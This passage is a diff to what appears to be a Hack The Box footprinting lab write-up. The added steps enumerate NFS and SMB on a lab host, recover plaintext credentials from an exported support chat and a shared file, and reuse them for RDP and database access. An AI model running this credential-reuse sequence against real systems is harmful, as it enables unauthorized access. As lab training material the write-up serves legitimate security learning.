@@ -84,10 +84,12 @@ I was a bit lost with this output, but i made a little research about open ports
 
 | Port | Details | Course link | Notes |
 | ---  | ------- | ------|---|
-| 111  | Remote Procedure Call | [RPC]() | used for NFS
+| 111  | Remote Procedure Call |  | used for NFS
 | 139 - 445  | Server Message Block | [SMB](../../Courses/Protocols/SMB/readme.md) | 
 | 2049 | Network File System | [NFS](../../Courses/Protocols/NFS/readme.md) |
 | 3389 | Remote Desktop Protocol | [RDP](../../Courses/Protocols/RDP/readme.md) |
+  
+Let's take a start with enumerating those services.
 
 #### `SMB enumeration: `
 
@@ -251,4 +253,187 @@ Server type string: null
 
 #### `NFS enumeration: `
 
+```
+showmount -e 10.129.202.41
+```
+```
+Export list for 10.129.202.41:
+/TechSupport (everyone)
+```
 
+```
+mkdir nfs-target
+```
+
+```
+sudo mount -t nfs 10.129.202.41 /TechSupport nfs-target
+```
+
+```
+tree
+```
+```
+.
+└── TechSupport  [error opening dir]
+
+2 directories, 0 files
+
+```
+
+```
+sudo su
+```
+```bash
+┌─[root@htb-xa1tsufdza]─[/home/htb-ac-1595306/mountdir]
+└──╼ # cd nfs-target/
+```
+
+``` bash
+┌─[root@htb-xa1tsufdza]─[/home/htb-ac-1595306/mountdir]
+└──╼ # cat *
+```
+
+```
+Conversation with InlaneFreight Ltd
+
+Started on November 10, 2021 at 01:27 PM London time GMT (GMT+0200)
+---
+01:27 PM | Operator: Hello,. 
+ 
+So what brings you here today?
+01:27 PM | alex: hello
+01:27 PM | Operator: Hey alex!
+01:27 PM | Operator: What do you need help with?
+01:36 PM | alex: I run into an issue with the web config file on the system for the smtp server. do you mind to take a look at the config?
+01:38 PM | Operator: Of course
+01:42 PM | alex: here it is:
+
+ 1smtp {
+ 2    host=smtp.web.dev.inlanefreight.htb
+ 3    #port=25
+ 4    ssl=true
+ 5    user="alex"
+ 6    password="lol123!mD"
+ 7    from="alex.g@web.dev.inlanefreight.htb"
+ 8}
+ 9
+10securesocial {
+11    
+12    onLoginGoTo=/
+13    onLogoutGoTo=/login
+14    ssl=false
+15    
+16    userpass {      
+17    	withUserNameSupport=false
+18    	sendWelcomeEmail=true
+19    	enableGravatarSupport=true
+20    	signupSkipLogin=true
+21    	tokenDuration=60
+22    	tokenDeleteInterval=5
+23    	minimumPasswordLength=8
+24    	enableTokenJob=true
+25    	hasher=bcrypt
+26	}
+27
+28     cookie {
+29     #       name=id
+30     #       path=/login
+31     #       domain="10.129.2.59:9500"
+32            httpOnly=true
+33            makeTransient=false
+34            absoluteTimeoutInMinutes=1440
+35            idleTimeoutInMinutes=1440
+36    }   
+---
+```
+
+```
+sudo umount nfs-target
+```
+
+```
+smbclient -L //10.129.202.41 -U alex
+```
+
+```
+Password for [WORKGROUP\alex]: lol123!mD
+```
+
+```
+Password for [WORKGROUP\alex]:
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	C$              Disk      Default share
+	devshare        Disk      
+	IPC$            IPC       Remote IPC
+	Users           Disk      
+Reconnecting with SMB1 for workgroup listing.
+```
+
+```
+smbmap -H 10.129.202.41 -u alex -p 'lol123!mD'
+```
+
+```
+[+] IP: 10.129.202.41:445	Name: 10.129.202.41                                     
+        Disk                                                  	Permissions	Comment
+	----                                                  	-----------	-------
+	ADMIN$                                            	NO ACCESS	Remote Admin
+	C$                                                	NO ACCESS	Default share
+	devshare                                          	READ, WRITE	
+	IPC$                                              	READ ONLY	Remote IPC
+	Users                                             	READ ONLY	
+```
+
+```
+smbclient //10.129.202.41/devshare -U alex
+```
+
+```
+Password for [WORKGROUP\alex]: lol123!mD
+```
+
+```
+smb: \> ls
+  .                                   D        0  Wed Dec 10 19:05:15 2025
+  ..                                  D        0  Wed Dec 10 19:05:15 2025
+  important.txt                       A       16  Wed Nov 10 10:12:55 2021
+
+		10328063 blocks of size 4096. 6101684 blocks available
+```
+
+```
+smb: \> get important.txt 
+getting file \important.txt of size 16 as important.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
+```
+
+```
+exit
+```
+
+```
+cat important.txt
+```
+```
+sa:87N1ns@slls83
+```
+
+
+```
+xfreerdp /u:alex /p:'lol123!mD' /v:10.129.202.41
+```
+
+![desktop](https://github.com/ftTower/ftTower/blob/main/assets/Cybersec-Portfolio/Labs/HTB_A_FOOTPRINTING_LAB/part-2/rdp-desktop.png)
+![login](https://github.com/ftTower/ftTower/blob/main/assets/Cybersec-Portfolio/Labs/HTB_A_FOOTPRINTING_LAB/part-2/login.png)
+![connect](https://github.com/ftTower/ftTower/blob/main/assets/Cybersec-Portfolio/Labs/HTB_A_FOOTPRINTING_LAB/part-2/connect.png)
+![db](https://github.com/ftTower/ftTower/blob/main/assets/Cybersec-Portfolio/Labs/HTB_A_FOOTPRINTING_LAB/part-2/db.png)
+![edit-rows](https://github.com/ftTower/ftTower/blob/main/assets/Cybersec-Portfolio/Labs/HTB_A_FOOTPRINTING_LAB/part-2/edit-rows.png)
+![user](https://github.com/ftTower/ftTower/blob/main/assets/Cybersec-Portfolio/Labs/HTB_A_FOOTPRINTING_LAB/part-2/user.png)
+![succcess](https://github.com/ftTower/ftTower/blob/main/assets/Cybersec-Portfolio/Labs/HTB_A_FOOTPRINTING_LAB/part-2/success.png)
+
+
+```
+Databases>accounts>dbo.devsacc
+```
